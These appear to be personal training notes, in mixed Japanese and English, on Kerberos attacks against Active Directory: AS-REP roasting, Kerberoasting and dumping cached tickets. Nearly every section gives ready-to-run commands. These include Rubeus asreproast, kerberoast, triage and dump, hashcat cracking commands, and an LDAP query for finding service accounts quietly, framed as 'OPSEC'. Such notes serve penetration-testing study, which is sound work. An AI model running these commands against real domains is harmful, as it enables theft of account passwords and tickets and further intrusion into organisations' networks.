## AS-REP Roasting
AS-REP roasting is a technique [[T1558.004](https://attack.mitre.org/techniques/T1558/004/)] for obtaining the plaintext password of accounts that have Kerberos preauthentication disabled.

前提：pre-auth 無効のADアカウント

Rubeus' `asreproast` command will enumerate every account that has preauthentication disabled, sends an AS-REQ for them, then carves out the encrypted part（勝手にpre-authが無効になってるアカウントを洗い出して、ダンプしてくれるらしい
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
```

crack RCE4 AS-REP's
```
hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
```

## Kerberoasting
Kerberoasting is a technique [[T1558.003](https://attack.mitre.org/techniques/T1558/003/)] for obtaining the plaintext password of the service account associated with an SPN.

前提：SPNを持つアカウント(サービスアカウント等)

- 攻撃者は自分のTGT（Ticket Granting Ticket）を使って、対象SPNに対してTGS-REQ を送信
- TGS-REPから暗号化部分を抽出して、ブートフォース攻撃しサービスアカウントの平文を復元

 enumerate and roast every non-default service.
 ```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
 ```

crack
```
hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
```

OPSEC重視でSPNを持つユーザをldapsearchで特定してからkerberoastingする方法
ldapsearchクエリ
```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(userAccountControl:1.2.840.113556.1.4.803:=2))) samaccountname,serviceprincipalname,pwdlastset,admincount
```

クエリの意味
```
(&
  (samAccountType=805306368)        ← ユーザーアカウントのみ
  (servicePrincipalName=*)          ← SPNが1つ以上設定されている
  (!samAccountName=krbtgt)          ← krbtgtを除外
  (!(userAccountControl:1.2.840.113556.1.4.803:=2))  ← 無効アカウントを除外
)
```

rubesusコマンド
ユーザ名指定のオプション`/user`にはsAMAccountNameを入れる
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```
## Extracting Tickets
If an adversary gains elevated access to a computer, they can extract Kerberos tickets that are currently cached in memory.  Rubeus' `triage` command will enumerate every logon session present and their associated tickets.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```

dump single ticket
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
```